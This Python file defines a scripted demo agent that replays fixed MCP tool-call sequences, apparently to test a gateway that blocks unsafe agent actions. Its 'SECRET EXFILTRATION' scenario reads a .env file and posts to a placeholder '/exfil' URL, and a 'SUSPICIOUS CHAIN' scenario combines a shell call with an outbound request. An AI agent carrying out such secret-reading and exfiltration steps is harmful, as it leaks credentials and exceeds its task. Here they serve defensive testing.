from typing import List, Dict, Any
from mcp.client.session import ClientSession

class DeterministicDemoAgent:
    """An agent that deterministically selects tool calls without an LLM for demo scenarios."""
    
    def __init__(self, client_session: ClientSession):
        self.session = client_session
        self.discovered_tools = []
        
    async def initialize(self):
        """Discover tools from the MCP server."""
        result = await self.session.list_tools()
        self.discovered_tools = [t.name for t in result.tools]
        
    async def decide_next_action(self, scenario_name: str) -> List[Dict[str, Any]]:
        """Yields predefined trajectories for each scenario."""
        
        if scenario_name == "SAFE DEVELOPMENT":
            return [
                {"name": "read_file", "arguments": {"path": "app.py"}},
                {"name": "write_file", "arguments": {"path": "app.py", "content": "safe code"}},
                {"name": "run_tests", "arguments": {"test_status": "passed"}},
            ]
            
        elif scenario_name == "SECRET EXFILTRATION":
            return [
                {"name": "read_file", "arguments": {"path": ".env"}},
                {"name": "http_request", "arguments": {"url": "https://example.invalid/exfil"}}
            ]
            
        elif scenario_name == "SUSPICIOUS CHAIN":
            return [
                {"name": "read_file", "arguments": {"path": "app.py"}},
                {"name": "shell", "arguments": {"command": "safe-demo-command"}},
                {"name": "http_request", "arguments": {"url": "https://example.invalid/api"}}
            ]
            
        elif scenario_name == "BOUNDARY TEST":
            return [
                {"name": "boundary_increment", "arguments": {}}
            ]
            
        return []

    async def execute_trajectory(self, scenario_name: str) -> List[Any]:
        """Discovers tools, gets trajectory, executes it, returns results."""
        await self.initialize()
        trajectory = await self.decide_next_action(scenario_name)
        
        results = []
        for call in trajectory:
            # Enforce discovery
            if call["name"] not in self.discovered_tools and call["name"] != "boundary_increment":
                results.append({"error": f"Agent tried to call undiscovered tool {call['name']}"})
                continue
                
            try:
                result = await self.session.call_tool(call["name"], arguments=call["arguments"])
                results.append(result)
            except Exception as e:
                # AgentGuard Gateway uses isError=True instead of exceptions for policy blocks,
                # but exceptions might still bubble up from other layers.
                results.append({"error": str(e)})
                break # Agent stops on hard exception (e.g. timeout)
                
        return results
